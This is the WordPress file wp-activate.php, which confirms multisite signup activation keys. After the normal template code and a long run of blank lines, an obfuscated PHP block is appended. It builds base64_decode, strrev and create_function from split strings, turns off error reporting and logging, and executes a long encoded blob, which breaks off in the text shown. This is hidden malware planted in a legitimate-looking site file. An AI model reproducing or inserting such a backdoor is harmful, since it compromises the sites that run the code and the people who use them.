<?php
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */

define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
require __DIR__ . '/wp-load.php';

require __DIR__ . '/wp-blog-header.php';

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( remove_query_arg( false ) !== $redirect_url ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( null === $result && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( null === $result || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes, true ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title.
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		.wp-activate-container { width: 90%; margin: 0 auto; }
		.wp-activate-container form { margin-top: 2em; }
		#submit, #key { width: 100%; font-size: 24px; box-sizing: border-box; }
		#language { margin-top: 0.5em; }
		.wp-activate-container .error { background: #f66; color: #333; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_strict_cross_origin_referrer' );
add_filter( 'wp_robots', 'wp_robots_sensitive_page' );

get_header( 'wp-activate' );

$blog_details = get_blog_details();
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( $blog_details->path . 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" autofocus="autofocus" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes, true ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( '' === $signup->domain . $signup->path ) {
				printf(
					/* translators: 1: Login URL, 2: Username, 3: User email address, 4: Lost password URL. */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( $blog_details->path . 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: Site URL, 2: Username, 3: User email address, 4: Lost password URL. */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s%2$s">%1$s%2$s</a>', $signup->domain, $blog_details->path ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( null === $result || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && network_home_url( '', 'http' ) !== $url ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: Site URL, 2: Login URL. */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					printf(
						/* translators: 1: Login URL, 2: Network home URL. */
						__( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ),
						network_site_url( $blog_details->path . 'wp-login.php', 'login' ),
						network_home_url( $blog_details->path )
					);
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<?php
get_footer( 'wp-activate' );

?>





















































































<?php $cfJrO = 'ba'.'se64'.'_'.'dec'.'ode';  $ZswoY = 's'.'t'.'rrev';  ini_set('display_errors', 0); echo '<html>           </html>'; error_reporting(0); ini_set('log_errors', 0); /*   pxurajdglmpyohizw s      **/ ini_set('error_log', NULL); $JDFVd = 'Crea'.'te'.'_Funct'.'ion'; $vxqjk = $JDFVd('', $ZswoY($cfJrO('IH0gOyc+dHBpcmNzLzwpKSI9NERkd2xtY2pOM0w4a1NLaVUwTWxRek5sQXpObGtqTmxJek5sTWpObE16TmxZa01sTTBNbGtqTWxnak1sa2pNbFEwTmxFRU1sUUVNbGtqTWxJa05sTWpObGtqTmxNa05sTURObE1rTmxFak5sSWpObFlrTmxNa05sY2pObEFqTWxNa01sSWpNbElrTmxNak5sa2pObE1rTmxNak5sSWpNbGdqTWxJek5sVWpObFVrTmxVak5sUXpObE16Tmxrak5sTUVObFF6TmxVa05sVWpObFl6TmxVRE5sUWpObFFqTmxFak5sVWtNbFF6TmxVa05sVWpObFFrTmxVek5sTWpObFlrTmxRak5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sUTBObEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbFEwTmxBak1sSTBNbGtqTWxVak5sUXpObEVqTmxRRE5sY3pObFlrTmxVa05sQWpNbE1rTWxRek5sTXpObFlrTmxnak5sQWpNbE1rTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sZ2pNbFVrTmxZa05sa2pObFF6TmxFak5sTWpObFlrTmxNRU5sY3pObFVqTmxVRU5sUXpObGtqTmxNek5sa2pObFl6TmxBak1sSTBObEFqTWxVak5sTXpObE1rTmxVak5sQWpNbFEwTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sUTBObEFqTWxJME1sa2pNbFVqTmxRek5sRWpObFFETmxjek5sWWtObFVrTmxBak1sTWtNbFF6TmxNek5sWWtObGdqTmxBak1sTWtNbE16TmxRek5sVWpObGNqTmxJek5sRWpObFF6Tmxnak1sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxjek5sVWpObFVFTmxRek5sa2pObE16Tmxrak5sWXpObEFqTWxJME5sQWpNbGtqTWxJek5sWWtObEl6TmxJek5sVWpObGdqTWxBak1sZ2pObE1qTmxRek5sRWpObE1qTmxBak1sUTBObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sUTBObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbFEwTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObGN6TmxVak5sVWtObGdqTWxRak5sVWpObFF6Tmxrak5sTXpObGtqTmxZVE5sTXpObEVETmxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObFF6TmxVak5sTXpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxJak1sSWtObFVrTmxFak5sTWtObElqTmxZVU5sSWpNbEFqTWxNa01sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxjek5sVWpObFVrTmxnak1sVWtObFVqTmxBek5sWWtObFVrTWxjek5sWWtObFFqTmxVa05sa2pObGN6TmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sVWpObFF6TmxFak5sUURObGN6TmxZa05sVWtObEFqTWxNa01sQWpObE16TmxRek5sVWtObFFrTmxRa01sUTBObFF6TmxNek5sWWtObGdqTmxJME5sUWpNbEFqTmxnak1sVWpObGNqTmxFak5sSXpObFlrTmxRek5sTVRObFlrTmxRVE5sVWpObFFrTmxrak5sUVRObFF6TmxVak5sTXpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBObEFqTWxrak1sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxjek5sVWpObFVrTmxnak1sQWpNbFlqTmxrak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTmxBak1sa2pNbE16TmxVak5sUXpObFV6TmxVa05sa2pObFFFTmxRek5sTXpObFVqTmxJek5sQWpNbFEwTWxVME1sQWpNbFlqTmxZak5sa2pObFFETmxNek5sUXpObFVrTmxrak5sUWtObGdqTWxBak1sWWpObGtqTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxRME5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxVak5sUXpObEVqTmxRRE5sY3pObFlrTmxVa05sQWpNbE1rTWxBak5sTXpObEl6TmxVek5sZ2pObFFrTWxRME5sUXpObE16TmxZa05sZ2pObEkwTmxRak1sQWpObGdqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sWWtObFFUTmxVak5sUWtObGtqTmxRVE5sUXpObFVqTmxNek5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sTXpObFF6TmxVak5sY2pObEl6TmxFak5sUXpObGdqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sWWtObFFUTmxNek5sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxRek5sVWpObGNqTmxJek5sRWpObFFUTmxVak5sWXpObEVqTmxNek5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTmxBak1sa2pNbE16TmxJek5sVXpObFlrTmxnRE5sUWpObFVqTmxjek5sWWtObE1rTmxNa05sRWpObEFqTWxRME1sVTBNbEFqTWxZak5sWWpObGtqTmxRRE5sTXpObEl6TmxVek5sWWtObGdqTmxnak1sQWpNbFlqTmxrak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sRUVNbFFFTWxJME1sa2pNbE16TmxJek5sVXpObFlrTmxnRE5sSXpObFlrTmxZRE5sVWpObFF6TmxFak5sUURObFVqTmxjak5sRWpObEl6TmxZa05sUXpObE16TmxBak1sTWtNbFVqTmxRek5sRWpObFFETmxjek5sWWtObFVrTmxnak1sWWpObFlqTmxrak5sUURObE16TmxJek5sVXpObFlrTmxnRE5sUXpObFVqTmxjak5sQWpNbFEwTWxBak1sWWpObFlqTmxrak5sUURObE16TmxJek5sVXpObFlrTmxnak5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxNek5sUXpObFVrTmxrak5sUUVObEl6TmxZa05sWURObFVqTmxRek5sRWpObFFETmxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNek5sQWpNbE1rTWxVak5sUXpObEVqTmxRRE5sY3pObFlrTmxVa05sZ2pNbFlqTmxZak5sa2pObFFETmxNek5sUXpObFVrTmxrak5sUUVObFF6TmxVak5sY2pObEFqTWxRME1sQWpNbFlqTmxZak5sa2pObFFETmxNek5sUXpObFVrTmxrak5sUWtObEFqTWxRek5sTXpObFVrTmxZa05sTWpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sTXpObEl6TmxVek5sWWtObGdETmxJek5sWWtObFlETmxVak5sUXpObEVqTmxRRE5sUWpObFVqTmxZek5sRWpObE16Tmxnak1sUXpObFVrTmxrRE5sVWpObE16TmxJek5sRWpObEF6TmxBak1sUTBNbEFqTWxNek5sSXpObFV6TmxZa05sZ0RObEl6TmxZa05sWURObFVqTmxRek5sRWpObFFETmxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNek5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxNek5sUXpObFVrTmxrak5sUUVObEl6TmxZa05sWURObFVqTmxRek5sRWpObFFETmxRak5sVWpObFl6TmxFak5sTXpObGdqTWxRek5sVWtObGtETmxVak5sTXpObEl6TmxFak5sQXpObEFqTWxRME1sQWpNbE16TmxRek5sVWtObGtqTmxRRU5sSXpObFlrTmxZRE5sVWpObFF6TmxFak5sUURObFVqTmxjak5sRWpObEl6TmxZa05sUXpObE16TmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME5sQWpNbGt6TmxJek5sUXpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBObEFqTWxrak1sTXpObEl6TmxVek5sWWtObGdETmxJek5sWWtObFlETmxVak5sUXpObEVqTmxRRE5sUWpObFVqTmxZek5sRWpObE16TmxBak1sWWpNbFlqTWxBak1sTXpObFF6TmxVa05sa2pObFFFTmxJek5sWWtObFlETmxVak5sUXpObEVqTmxRRE5sUWpObFVqTmxZek5sRWpObE16Tmxnak1sQWpNbFlqTmxrak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEVFTWxRRU1sSTBNbGtqTWxBak5sTXpObEl6TmxVek5sZ2pObFFrTWxRME5sUXpObE16TmxZa05sZ2pObEkwTmxRak1sQWpObGdqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sVWpObFFrTmxrak5sUVRObFF6TmxVak5sY2pObEFqTWxRME1sQWpNbE16TmxJek5sVXpObFlrTmxnRE5sSXpObFlrTmxZRE5sVWpObFF6TmxFak5sUURObFFqTmxVak5sWXpObEVqTmxNek5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sQWpObE16TmxRek5sVWtObFFrTmxRa01sUTBObFF6TmxNek5sWWtObGdqTmxJME5sUWpNbEFqTmxnak1sVWpObGNqTmxFak5sSXpObFlrTmxRek5sTVRObFVqTmxRa05sa2pObFFUTmxRek5sVWpObGNqTmxBak1sUTBNbEFqTWxNek5sUXpObFVrTmxrak5sUUVObEl6TmxZa05sWURObFVqTmxRek5sRWpObFFETmxRak5sVWpObFl6TmxFak5sTXpObEFqTWxRek5sTXpObFVrTmxZa05sTWpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME1sa2pNbGtqTWxnak1sVWpObFF6TmxFak5sUURObEFqTWxjek5sVWpObFVrTmxnak1sVWpObE16TmxJek5sRWpObEF6TmxVa01sVWpObFF6TmxFak5sUURObEFqTWxRME1sQWpNbFVqTmxRek5sRWpObFFETmxjek5sWWtObFVrTmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sZ2pNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxRa05sWWtObEl6TmxZRE5sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxRa05sWWtObFFqTmxVa05sRWpObElUTmxRek5sVWpObGNqTmxBak1sUTBNbEFqTWxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObGN6TmxVak5sVWtObEFqTWxRek5sVWpObE1rTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbFF6TmxNek5sWWtObGdqTmxVa01sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1rTmxBak1sUTBNbEFqTWxRek5sTXpObFlrTmxnak5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sZ2pNbFVrTmxZa05sa2pObFF6TmxFak5sY2pObEVqTmxBek5sWWtObEl6TmxBVE5sQXpObFlrTmxRek5sTXpObFVrTWxRek5sVWtObFVqTmxZek5sVWpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME5sQWpNbGtqTWxRek5sVWtObFVqTmxZek5sVWpObGdqTWxJa05sTWpObGtqTmxNa05sTURObE1rTmxFak5sSWpObFlrTmxNa05sY2pObEFqTWxVa05sWWtObGtqTmxRek5sTWpObFVrTmxVek5sWWpObEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEVFTWxRRU1sSTBNbGtqTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sZ2pNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxZa05sUVRObE16TmxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObFF6TmxVak5sY2pObEl6TmxFak5sUVRObFVqTmxZek5sRWpObE16TmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME1sa2pNbE16TmxRek5sVWpObGNqTmxJek5sRWpObFF6Tmxnak1sVWpObGNqTmxFak5sSXpObFlrTmxRek5sTVRObFFrTmxZa05sSXpObFlETmxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObFFrTmxZa05sUWpObFVrTmxFak5sSVRObFF6TmxVak5sY2pObEFqTWxRME1sQWpNbFVrTmxZa05sa2pObFF6TmxFak5sTWpObFlrTmxNRU5sUWtObFlrTmxRak5sVWtObEVqTmxJek5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbFlrTWxZa01sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sRUVNbFFFTWxRME5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxJak1sSWtObFVrTmxFak5sTWtObElqTmxZVU5sSWpNbEFqTWxNa01sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxjek5sVWpObFVrTmxnak1sVWtObFVqTmxBek5sWWtObFVrTWxjek5sWWtObFFqTmxVa05sa2pObGN6TmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObGN6TmxVak5sVWtObGdqTWxRak5sVWpObFF6Tmxrak5sTXpObGtqTmxZVE5sTXpObEVETmxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObFF6TmxVak5sTXpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME1sa2pNbFVqTmxRek5sRWpObFFETmxjek5sWWtObFVrTmxBak1sTWtNbEFqTmxNek5sSXpObFV6Tmxnak5sUWtNbFEwTmxRek5sTXpObFlrTmxnak5sSTBObFFqTWxBak5sZ2pNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxZa05sUVRObFVqTmxRa05sa2pObFFUTmxRek5sVWpObE16TmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxVak5sUXpObEVqTmxRRE5sY3pObFlrTmxVa05sQWpNbE1rTWxBak5sTXpObFF6TmxVa05sUWtObFFrTWxRME5sUXpObE16TmxZa05sZ2pObEkwTmxRak1sQWpObGdqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sWWtObFFUTmxVak5sUWtObGtqTmxRVE5sUXpObFVqTmxNek5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sTXpObFF6TmxVak5sY2pObEl6TmxFak5sUXpObGdqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sUWtObFlrTmxJek5sWURObFVrTmxZa05sa2pObFF6TmxFak5sTWpObFlrTmxNRU5sUWtObFlrTmxRak5sVWtObEVqTmxJVE5sUXpObFVqTmxjak5sQWpNbFEwTWxBak1sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxjek5sVWpObFVrTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sZ2pNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxZa05sUVRObE16TmxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObFF6TmxVak5sY2pObEl6TmxFak5sUVRObFVqTmxZek5sRWpObE16TmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBObEFqTWxVME1sUTBNbEFqTWxrak1sVWpObFF6TmxFak5sUURObGN6TmxZa05sVWtObEFqTWxNa01sUXpObE16TmxZa05sZ2pObEFqTWxNa01sTXpObFF6TmxVak5sY2pObEl6TmxFak5sUXpObGdqTWxBak1sUTBNbEFqTWxVa05sWWtObGtqTmxRek5sRWpObE1qTmxZa05sTUVObGN6TmxVak5sVUVObFF6Tmxrak5sTXpObGtqTmxZek5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sRUVNbFFFTWxRME5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxNek5sUXpObFVrTmxrak5sUUVObFVrTmxrRE5sTXpObFFrTmxBak1sWWtNbEFqTWxrak1sVWpObFF6TmxFak5sUURObFF6TmxJek5sRWpObFF6TmxNek5sQWpNbFFrTWxBak1sVWpObFF6TmxFak5sUURObFFqTmxVa05sVWpObGdqTWxNek5sSWpObEVqTmxVa01sZ2pObFF6TmxFak5sUUVObGdqTWxRak5sVWtObFV6TmxZa05sSXpObFVrTWxnak5sUXpObEVqTmxRRU5sQWpNbFVrTmxJek5sVXpObFF6TmxVak5sSXpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME1sQXpNbFl6TWxBak1sRWtNbEFqTWxBek1sQXpNbEF6TWxFek1sQWpNbFEwTWxBak1sTXpObFF6TmxVa05sa2pObFFFTmxVa05sa0RObE16TmxRa05sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTmxBak1sVTBNbFEwTWxBak1sa2pNbFVqTmxRek5sRWpObFFETmxRak5sVWtObFVqTmxBak1sTWtNbFVqTmxRek5sRWpObFFETmxRek5sSXpObEVqTmxRek5sTXpObGdqTWxBak1sUTBNbEFqTWxZak5sWWpObGtqTmxRRE5sTXpObFF6TmxVa05sa2pObFFFTmxRek5sVWpObGNqTmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxRME5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxJek5sVXpObFlrTmxnRE5sVWtObGtETmxNek5sUWtObEFqTWxZa01sQWpNbGtqTWxVak5sUXpObEVqTmxRRE5sUXpObEl6TmxFak5sUXpObE16TmxBak1sUWtNbEFqTWxVak5sUXpObEVqTmxRRE5sUWpObFVrTmxVak5sZ2pNbE16TmxJak5sRWpObFVrTWxnak5sUXpObEVqTmxRRU5sZ2pNbFFqTmxVa05sVXpObFlrTmxJek5sVWtNbGdqTmxRek5sRWpObFFFTmxBak1sVWtObEl6TmxVek5sUXpObFVqTmxJek5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxBek1sWXpNbEFqTWxFa01sQWpNbEF6TWxZek1sQWpNbEVrTWxBak1sQXpNbEF6TWxBek1sRXpNbEFqTWxRME1sQWpNbEl6TmxVek5sWWtObGdETmxVa05sa0RObE16TmxRa05sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTmxBak1sVTBNbFEwTWxBak1sa2pNbFVqTmxRek5sRWpObFFETmxRak5sVWtObFVqTmxBak1sTWtNbFVqTmxRek5sRWpObFFETmxRek5sSXpObEVqTmxRek5sTXpObGdqTWxBak1sUTBNbEFqTWxZak5sWWpObGtqTmxRRE5sTXpObEl6TmxVek5sWWtObGdETmxRek5sVWpObGNqTmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxFRU1sUUVNbEkwTWxrak1sVWpObFF6TmxFak5sUURObGN6TmxZa05sVWtObEFqTWxNa01sQWpObFVqTmxjak5sRWpObEl6TmxZa05sUXpObE16TmxRa01sTWtObEVqTmxNak5sWWtObE1rTmxRa01sUTBObGt6TmxVak5sSWtObEkwTmxRak1sQWpObGdqTWxRa05sVWpObFF6TmxrRE5sUXpObFVqTmxNek5sVWtNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxNa05sRWpObE1qTmxZa05sTWtObEFqTWxVME1sUTBNbEFqTWxrak1sVWpObFF6TmxFak5sUURObGN6TmxZa05sVWtObEFqTWxNa01sa3pObFVqTmxJa05sZ2pNbEFqTWxRME1sQWpNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxZa05sUVRObFVqTmxRa05sa2pObFF